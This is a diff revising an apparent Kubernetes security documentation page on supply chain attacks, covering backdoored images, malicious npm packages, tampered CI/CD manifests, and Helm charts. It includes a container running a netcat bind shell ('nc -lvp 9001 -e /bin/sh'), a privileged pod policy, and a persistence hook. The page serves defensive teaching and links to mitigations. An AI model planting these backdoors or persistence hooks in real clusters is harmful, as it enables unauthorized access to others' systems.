@@ -1,33 +1,33 @@
 ---
-sidebar_position: 10
+sidebar_position: 6
 title: "Supply Chain Attacks"
 description: "How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters."
 ---
 
 # Supply Chain Attacks
 
-A **supply chain attack** in Kubernetes involves **compromising container images, software dependencies, CI/CD pipelines, or Helm charts** to inject malicious code into workloads. Attackers use these vulnerabilities to **gain initial access, escalate privileges, and exfiltrate sensitive data**.
+Supply chain attacks in Kubernetes target the **container build process, dependencies, CI/CD pipelines, or Helm charts** to introduce malicious components into your cluster. These attacks can lead to **unauthorized access, persistent backdoors, and data exfiltration**.
 
 ---
 
-## Exploitation Steps: Compromising the Software Supply Chain
+## Exploitation Steps: Poisoning the Software Supply Chain
 
-An attacker injects malicious code into a Kubernetes deployment by exploiting weaknesses in the container build process.
+An attacker compromises the cluster by introducing malicious components during the software delivery lifecycle.
 
-### Step 1: Poison a Public Image
+### 1. Publish a Malicious Container Image
 
-The attacker publishes a **malicious container image** to a public registry:
+The attacker creates and pushes a backdoored image to a public registry:
 
 ```bash
 docker build -t attacker/malicious-app .
 docker push docker.io/attacker/malicious-app
 ```
 
-If an organization unknowingly pulls this image, it introduces malicious code into production.
+---
 
-### Step 2: Exploit Weak Image Verification
+### 2. Deploy Unverified Image in Production
 
-An organization deploys a container without verifying its source:
+A Kubernetes workload unknowingly uses the attacker’s image:
 
 ```yaml
 apiVersion: apps/v1
@@ -42,48 +42,41 @@ spec:
           image: docker.io/attacker/malicious-app
 ```
 
-Since no image signing or verification is enforced, the compromised container runs in the cluster.
+No signature validation or source verification is performed.
 
-### Step 3: Inject Malicious Dependencies
+---
 
-If the CI/CD pipeline **does not validate third-party dependencies**, the attacker injects a malicious package into a widely used library.
+### 3. Inject Malicious Dependencies
 
-Example of an attacker publishing a compromised package:
+The attacker publishes a compromised package:
 
 ```bash
 npm publish compromised-library
 ```
 
-Developers unknowingly include this package in their applications, allowing remote code execution.
+It is pulled automatically by an unsuspecting developer into a container image, enabling **remote code execution** in production.
 
-### Step 4: Compromise CI/CD Pipeline
+---
 
-The attacker exploits misconfigured CI/CD secrets to modify Kubernetes manifests:
+### 4. Tamper with the CI/CD Pipeline
+
+The attacker steals CI secrets and modifies manifests:
 
 ```bash
 kubectl apply -f attacker-modified-deployment.yaml
 ```
 
-By injecting malicious configurations, the attacker gains persistent access to the cluster.
+This injects malicious logic into deployments automatically.
 
 ---
 
 ## Exploitation Steps: Deploying a Malicious Helm Chart
 
-An attacker manipulates Helm charts to introduce **unauthorized workloads, privilege escalation, or backdoors** into a Kubernetes cluster.
+Helm charts offer another attack surface for supply chain compromise.
 
-### Step 1: Publish a Malicious Helm Chart
+### 1. Publish a Malicious Helm Chart
 
-The attacker creates a Helm chart containing **hidden malicious configurations**:
-
-```yaml
-apiVersion: v2
-name: malicious-app
-version: 1.0.0
-description: "A vulnerable Helm chart"
-```
-
-**Example of Malicious Workload in Values.yaml**:
+The attacker embeds a backdoor in a Helm chart:
 
 ```yaml
 containers:
@@ -95,27 +88,31 @@ containers:
     args: ["while true; do nc -lvp 9001 -e /bin/sh; done"]
 ```
 
-The attacker **uploads the chart** to a public Helm repository:
+They then push it to a public repository:
 
 ```bash
 helm package malicious-app
 helm push malicious-app-1.0.0.tgz oci://public-helm-repo
 ```
 
-### Step 2: Exploit Unverified Helm Chart Usage
+---
 
-An unsuspecting user installs the chart **without verifying its integrity**:
+### 2. Install Chart Without Verification
+
+A user installs the chart without checking provenance:
 
 ```bash
 helm repo add untrusted-repo oci://public-helm-repo
 helm install vulnerable-app untrusted-repo/malicious-app
 ```
 
-The **malicious container is deployed**, providing the attacker with a **reverse shell**.
+The **malicious workload** is now running.
 
-### Step 3: Escalate Privileges Using a Malicious PodSecurityPolicy
+---
 
-If **Pod Security Policies (PSP) or admission controls** are not enforced, the attacker modifies Helm templates to allow privilege escalation:
+### 3. Bypass Pod Security Policies
+
+The attacker escalates privileges through insecure templates:
 
 ```yaml
 apiVersion: policy/v1beta1
@@ -130,15 +127,17 @@ spec:
     rule: RunAsAny
 ```
 
+They enable this at install:
+
 ```bash
 helm install --set securityPolicy.privileged=true exploit-app
 ```
 
-The attack **bypasses Kubernetes security policies**, allowing **root access** on worker nodes.
+---
 
-### Step 4: Persist in the Cluster
+### 4. Maintain Persistence After Uninstall
 
-The attacker modifies **Helm hooks** to maintain persistence after deletion:
+A Helm hook ensures the backdoor remains:
 
 ```yaml
 hooks:
@@ -152,24 +151,27 @@ hooks:
           ]
 ```
 
-Even if the Helm release is removed:
+Even if the user runs:
 
 ```bash
 helm uninstall exploit-app
 ```
 
-The malicious workload **remains active**, ensuring long-term access.
-
-### Result
-
-The attacker has **infiltrated the Kubernetes environment** via a compromised supply chain, enabling **persistent access, privilege escalation, and data theft**.
+The malicious deployment **reinstalls itself**.
 
 ---
 
-## Mitigation Steps
+### Result
 
-To protect against **supply chain attacks**, follow the security best practices outlined in:
+The attacker successfully compromises the Kubernetes cluster via supply chain vectors, enabling:
 
-➡ **[Securing the Kubernetes Supply Chain](/docs/best_practices/supply_chain_mitigation)**
+- Deployment of malicious containers and packages
+- Privilege escalation
+- Long-term persistence
+- CI/CD pipeline abuse
 
-This guide covers techniques such as **container image signing, vulnerability scanning, CI/CD hardening, Helm security enforcement, and dependency verification** to prevent attackers from compromising the software supply chain.
+---
+
+## Mitigation
+
+➡ [Securing the Kubernetes Supply Chain](/docs/best_practices/supply_chain_mitigation)
